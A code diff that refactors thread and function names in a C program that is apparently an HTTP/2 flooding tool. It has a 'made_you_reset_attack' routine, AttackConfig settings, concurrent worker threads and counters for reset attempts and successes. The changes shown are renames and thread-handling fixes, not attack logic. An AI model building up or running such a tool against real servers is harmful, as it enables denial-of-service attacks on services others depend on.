@@ -144,8 +144,9 @@ typedef struct {
 ProxyList proxy_list = {0};
 AtomicStats stats = {0, 0, 0, 0, 0, 0, 0, PTHREAD_MUTEX_INITIALIZER};
 volatile bool running = true;
-pthread_t workers[MAX_WORKERS];
-pthread_t monitor_thread;
+pthread_t worker_threads[MAX_WORKERS];
+pthread_t delay_monitor_thread;
+pthread_t stats_thread_id;
 time_t start_time;
 int64_t current_delay = 0;
 pthread_mutex_t delay_mutex = PTHREAD_MUTEX_INITIALIZER;
@@ -172,9 +173,9 @@ void destroy_h2_connection(H2Connection *conn);
 void send_http2_request(H2Connection *conn, AttackConfig *cfg);
 void send_http1_request(H2Connection *conn, AttackConfig *cfg);
 void made_you_reset_attack(AttackConfig *cfg);
-void* worker_thread(void *arg);
-void* monitor_thread(void *arg);
-void* stats_printer(void *arg);
+void* worker_function(void *arg);
+void* delay_monitor_function(void *arg);
+void* stats_printer_function(void *arg);
 void detect_http_versions(AttackConfig *cfg);
 void signal_handler(int sig);
 void print_banner();
@@ -629,7 +630,7 @@ void destroy_h2_connection(H2Connection *conn) {
     free(conn);
 }
 
-void* worker_thread(void *arg) {
+void* worker_function(void *arg) {
     AttackConfig *cfg = (AttackConfig*)arg;
     int bursts_since_cycle = 0;
     const int cycle_threshold = 50;
@@ -695,7 +696,7 @@ void* worker_thread(void *arg) {
     return NULL;
 }
 
-void* monitor_thread(void *arg) {
+void* delay_monitor_function(void *arg) {
     AttackConfig *cfg = (AttackConfig*)arg;
     
     while (running) {
@@ -713,7 +714,7 @@ void* monitor_thread(void *arg) {
     return NULL;
 }
 
-void* stats_printer(void *arg) {
+void* stats_printer_function(void *arg) {
     AttackConfig *cfg = (AttackConfig*)arg;
     
     while (running) {
@@ -945,26 +946,24 @@ int main(int argc, char *argv[]) {
     start_time = time(NULL);
     running = true;
     
-    pthread_t mon_thread;
-    pthread_create(&mon_thread, NULL, monitor_thread, &cfg);
+    pthread_create(&delay_monitor_thread, NULL, delay_monitor_function, &cfg);
     
-    pthread_t stats_thread;
-    pthread_create(&stats_thread, NULL, stats_printer, &cfg);
+    pthread_create(&stats_thread_id, NULL, stats_printer_function, &cfg);
     
     AttackConfig *configs = malloc(sizeof(AttackConfig) * cfg.concurrency);
     for (int i = 0; i < cfg.concurrency; i++) {
         memcpy(&configs[i], &cfg, sizeof(AttackConfig));
-        pthread_create(&workers[i], NULL, worker_thread, &configs[i]);
+        pthread_create(&worker_threads[i], NULL, worker_function, &configs[i]);
     }
     
     sleep(cfg.duration_sec);
     running = false;
     
     for (int i = 0; i < cfg.concurrency; i++) {
-        pthread_join(workers[i], NULL);
+        pthread_join(worker_threads[i], NULL);
     }
-    pthread_join(stats_thread, NULL);
-    pthread_join(mon_thread, NULL);
+    pthread_join(stats_thread_id, NULL);
+    pthread_join(delay_monitor_thread, NULL);
     
     long long requests, responses, errors, reset_attempts, reset_success, total_lat;
     
